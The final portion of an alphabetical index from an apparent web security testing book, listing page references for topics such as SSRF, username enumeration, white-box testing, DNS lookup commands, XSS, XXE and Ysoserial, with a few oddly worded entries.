SSRFs/RMI, optimizing [292](#ch13.xhtml_page292), [293](#ch13.xhtml_page293)

SSRF, steps [252](#ch11.xhtml_page252)

SSRF, vulnerabilities [253](#ch11.xhtml_page253)

Static Analysis [322](#ch15.xhtml_page322)

Synchronizer Token [251](#ch11.xhtml_page251)

Synchronizer Token, characteristics [251](#ch11.xhtml_page251)

U

user() [55](#ch04.xhtml_page55)

User Agents [104](#ch05.xhtml_page104)

User Agents, switching steps [104](#ch05.xhtml_page104), [105](#ch05.xhtml_page105)

User-Agent Switcher
Extension [105](#ch05.xhtml_page105)-[108](#ch05.xhtml_page108)

Username Enumeration [179](#ch09.xhtml_page179)

Username Enumeration, architecture [180](#ch09.xhtml_page180)

Username Enumeration, testing [180](#ch09.xhtml_page180), [181](#ch09.xhtml_page181)

Username Enumeration, vulnerabilities [182](#ch09.xhtml_page182)

User Registration [182](#ch09.xhtml_page182)

User Registration, architecture [184](#ch09.xhtml_page184)-[186](#ch09.xhtml_page186)

User Registration, vulnerabilities

Mass Assignment [183](#ch09.xhtml_page183), [184](#ch09.xhtml_page184)

Secure, coding [186](#ch09.xhtml_page186), [187](#ch09.xhtml_page187)

Testing [182](#ch09.xhtml_page182), [183](#ch09.xhtml_page183)

W

White Box Testing [13](#ch01.xhtml_page13), [14](#ch01.xhtml_page14)

White Box Testing, characteristics

code quality, improving [15](#ch01.xhtml_page15)

code, reviewing [14](#ch01.xhtml_page14)

comprehensive, assessment [15](#ch01.xhtml_page15)

in-depth, analyzing [14](#ch01.xhtml_page14)

internal details, accessing [14](#ch01.xhtml_page14)

internal logic, focus [14](#ch01.xhtml_page14)

precise, targeting [15](#ch01.xhtml_page15)

root, causes [14](#ch01.xhtml_page14)

WHOIS [19](#ch02.xhtml_page19)

WHOIS, commands

Dig [20](#ch02.xhtml_page20)

Dig -t AXFR host @NS [21](#ch02.xhtml_page21)

dig -t NS host +short [21](#ch02.xhtml_page21)

Host [21](#ch02.xhtml_page21)

nslookup [21](#ch02.xhtml_page21)

X

XML [83](#ch04.xhtml_page83), [84](#ch04.xhtml_page84)

XML, actions

adjust, testing [150](#ch07.xhtml_page150)

cease, testing [149](#ch07.xhtml_page149)

clarify, apologize [150](#ch07.xhtml_page150)

documents [149](#ch07.xhtml_page149)

incident, learning [149](#ch07.xhtml_page149)

IT/DevOps, communicating [149](#ch07.xhtml_page149)

notify, stakeholders [149](#ch07.xhtml_page149)

recommendation [149](#ch07.xhtml_page149)

revert, changing [149](#ch07.xhtml_page149)

rules, reviewing [149](#ch07.xhtml_page149)

XML, guidelines [149](#ch07.xhtml_page149)

XML Path Language (XPath) [85](#ch04.xhtml_page85), [86](#ch04.xhtml_page86)

XPath, queries [85](#ch04.xhtml_page85)

XSS [70](#ch04.xhtml_page70), [71](#ch04.xhtml_page71)

XSS, categories

DOM Cross-Site [76](#ch04.xhtml_page76)-[78](#ch04.xhtml_page78)

Two Store Cross-Site [71](#ch04.xhtml_page71)-[76](#ch04.xhtml_page76)

XSS, concexts [80](#ch04.xhtml_page80), [81](#ch04.xhtml_page81)

XSS, elements

functions, utilizing [82](#ch04.xhtml_page82)

Java, configuring [81](#ch04.xhtml_page81), [82](#ch04.xhtml_page82)

JSP, optimizing [81](#ch04.xhtml_page81)

XSS With Cookie, stealing [78](#ch04.xhtml_page78)-[80](#ch04.xhtml_page80)

XXE [146](#ch07.xhtml_page146)

XXE, exploitation [146](#ch07.xhtml_page146), [147](#ch07.xhtml_page147)

XXE, impact [146](#ch07.xhtml_page146)

Y

Ysoserial, optimizing [262](#ch12.xhtml_page262)-[267](#ch12.xhtml_page267)